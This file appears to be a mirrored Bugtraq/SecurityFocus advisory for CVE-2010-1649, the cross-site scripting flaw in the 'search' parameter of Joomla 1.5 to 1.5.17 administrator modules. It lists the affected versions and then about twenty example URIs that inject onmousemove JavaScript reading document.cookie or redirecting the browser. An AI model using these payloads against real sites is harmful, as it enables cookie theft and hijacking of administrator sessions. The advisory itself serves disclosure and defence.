@@ -1,0 +1,150 @@
+#SpeeDr00t@Black Falcon<br>#bid40444<p><b><span style="font-size: 18pt;">Joomla! Multiple Modules 'search' Parameter Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/40444/info">info</a><br><a href="http://www.securityfocus.com/bid/40444/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/40444/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/40444/solution">solution</a><br><a href="http://www.securityfocus.com/bid/40444/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				40444
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-1649<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 28 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:02PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Riyaz Ahemed
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Joomla Joomla 1.5.17 <br/>
+					
+				
+					Joomla Joomla 1.5.16 <br/>
+					
+				
+					Joomla Joomla 1.5.15 <br/>
+					
+				
+					Joomla Joomla 1.5.14 <br/>
+					
+				
+					Joomla Joomla 1.5.13 <br/>
+					
+				
+					Joomla Joomla 1.5.12 <br/>
+					
+				
+					Joomla Joomla 1.5.11 <br/>
+					
+				
+					Joomla Joomla 1.5.10 <br/>
+					
+				
+					Joomla Joomla 1.5.9 <br/>
+					
+				
+					Joomla Joomla 1.5.8 <br/>
+					
+				
+					Joomla Joomla 1.5.7 <br/>
+					
+				
+					Joomla Joomla 1.5.6 <br/>
+					
+				
+					Joomla Joomla 1.5.5 <br/>
+					
+				
+					Joomla Joomla 1.5.4 <br/>
+					
+				
+					Joomla Joomla 1.5.3 <br/>
+					
+				
+					Joomla Joomla 1.5.2 <br/>
+					
+				
+					Joomla Joomla 1.5.1 <br/>
+					
+				
+					Joomla Joomla 1.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Joomla Joomla 1.5.18 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues by enticing an unsuspecting user to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/administrator/index.php?option=com_users&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_users&amp;amp;search=%22%20onmousemove=%22javascript:window.location.assign%28%27http://www.example.com%27%29%22%3E<br/>http://www.example.com/administrator/index.php?option=com_trash&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_content&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_sections&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_categories&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_frontpage&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_menus&amp;amp;task=view&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_messages&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_banners&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_banners&amp;amp;c=client&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_categories&amp;amp;section=com_banner&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_contact&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_categories&amp;amp;section=com_contact_details&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_newsfeeds&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_categories&amp;amp;section=com_newsfeeds&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_poll&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_weblinks&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_categories&amp;amp;section=com_weblinks&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_modules&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E<br/>http://www.example.com/administrator/index.php?option=com_plugins&amp;amp;search=%22%20onmousemove=%22javascript:alert%28document.cookie%29;%22%3E
+	
+		<ul>
+</ul>
+</div>
